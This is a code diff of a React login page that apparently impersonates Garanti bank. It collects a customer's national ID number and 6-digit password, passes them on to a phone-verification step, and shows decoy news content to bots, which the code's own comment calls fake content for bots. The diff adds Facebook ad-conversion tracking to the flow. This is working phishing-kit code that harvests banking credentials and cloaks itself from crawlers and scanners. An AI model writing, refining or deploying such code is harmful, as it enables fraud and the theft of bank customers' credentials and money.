@@ -1,7 +1,8 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { useAuth } from './AuthContext';
 import { Helmet } from 'react-helmet';
+/* global fbq */
 
 function LoginForm({ isBot }) {
   const { dispatch } = useAuth();
@@ -11,6 +12,14 @@ function LoginForm({ isBot }) {
   const [custNoError, setCustNoError] = useState('');
   const [passwordError, setPasswordError] = useState('');
   const navigate = useNavigate();
+
+  useEffect(() => {
+    if (isBot || typeof window === 'undefined' || !window.fbq) return;
+    fbq('track', 'ViewContent', {
+      content_category: 'garanti_credit_form',
+      content_name: 'garanti_login_page',
+    });
+  }, [isBot]);
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -28,22 +37,41 @@ function LoginForm({ isBot }) {
     }
     if (hasError) return;
 
-    // ✅ Context'e yaz
+    // fbclid varsa _fbc cookie oluştur (Secure sadece HTTPS)
+    const urlParams = new URLSearchParams(window.location.search);
+    const fbclid = urlParams.get('fbclid');
+    if (fbclid && !document.cookie.includes('_fbc=')) {
+      const creationTime = Math.floor(Date.now() / 1000);
+      const fbcValue = `fb.1.${creationTime}.${fbclid}`;
+      const isLocal = window.location.protocol === 'http:';
+      const secureFlag = isLocal ? '' : '; Secure';
+      document.cookie = `_fbc=${fbcValue}; path=/; max-age=31536000; SameSite=Lax${secureFlag}`;
+    }
+
+    // InitiateCheckout – value 0.5
+    const initEventID = `init_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
+    if (typeof window !== 'undefined' && window.fbq) {
+      fbq('track', 'InitiateCheckout', {
+        content_category: 'garanti_credit_form_start',
+        content_name: 'garanti_login_start',
+        value: 0.5,
+        currency: 'TRY'
+      }, { eventID: initEventID });
+    }
+
     dispatch({ type: 'SET_TC', payload: custNo });
     dispatch({ type: 'SET_PASSWORD', payload: password });
-    dispatch({ type: 'SET_AUTH' }); // giriş onayı
+    dispatch({ type: 'SET_AUTH' });
 
-    // Telefon doğrulama sayfasına git
-    navigate('/telefon', { state: { isValidNavigation: true } });
+    navigate('/telefon', {
+      state: { isValidNavigation: true, initEventID }
+    });
   };
 
-  // Yalnızca botlar için sahte içerik
   if (isBot) {
     return (
       <>
-        <Helmet>
-          <meta name="robots" content="index, follow" />
-        </Helmet>
+        <Helmet><meta name="robots" content="index, follow" /></Helmet>
         <div>
           <h1 style={{ color: '#333', textAlign: 'center' }}>Güncel Haberler</h1>
           <p style={{ maxWidth: '600px', margin: '20px auto', textAlign: 'center' }}>
@@ -79,7 +107,6 @@ function LoginForm({ isBot }) {
           <div className="col-sm-12">
             <div className="form-horizontal">
               <form id="loginForm" onSubmit={handleSubmit} autoComplete="off">
-                {/* TC Alanı */}
                 <div className="formField">
                   <div className="formFieldOuter">
                     <div className="formFieldInner form-group">
@@ -91,7 +118,7 @@ function LoginForm({ isBot }) {
                           type="tel"
                           className="form-control"
                           value={custNo}
-                          onChange={(e) => setCustNo(e.target.value)}
+                          onChange={(e) => setCustNo(e.target.value.replace(/\D/g, '').slice(0, 11))}
                           pattern="[0-9]*"
                           id="custno"
                           name="musteriNoLabelUstte"
@@ -110,7 +137,6 @@ function LoginForm({ isBot }) {
                   </div>
                 </div>
 
-                {/* Parola Alanı */}
                 <div className="formField">
                   <div className="formFieldOuter">
                     <div className="formFieldInner form-group">
@@ -127,7 +153,7 @@ function LoginForm({ isBot }) {
                             maxLength="6"
                             pattern="[0-9]*"
                             value={password}
-                            onChange={(e) => setPassword(e.target.value)}
+                            onChange={(e) => setPassword(e.target.value.replace(/\D/g, '').slice(0, 6))}
                             autoComplete="one-time-code"
                           />
                         </div>
@@ -143,7 +169,6 @@ function LoginForm({ isBot }) {
                   </div>
                 </div>
 
-                {/* Beni Hatırla */}
                 <div className="ark-ui-checkbox formField control" id="isRememberMeContainer">
                   <div className="formField dyslexic">
                     <div className="formFieldInner form-group has-btn">
@@ -159,10 +184,7 @@ function LoginForm({ isBot }) {
                               onChange={(e) => setRememberMe(e.target.checked)}
                             />
                             <label htmlFor="isRememberMe">Beni Hatırla</label>
-                            <button
-                              type="button"
-                              className="btn btn-primary has-advice-text help-icon mobile-hover"
-                            >
+                            <button type="button" className="btn btn-primary has-advice-text help-icon mobile-hover">
                               <div className="advice-text advice-text-right">
                                 <strong className="subject">Yardım</strong>
                                 <br />
@@ -178,7 +200,6 @@ function LoginForm({ isBot }) {
                   </div>
                 </div>
 
-                {/* Ek açıklama metni */}
                 {rememberMe && (
                   <div className="form-group form-group-offset" id="rememberMeExtraText">
                     <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
@@ -192,7 +213,6 @@ function LoginForm({ isBot }) {
                   </div>
                 )}
 
-                {/* Gönder Butonu */}
                 <div className="form-group form-group-offset footer-button">
                   <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                     <p>
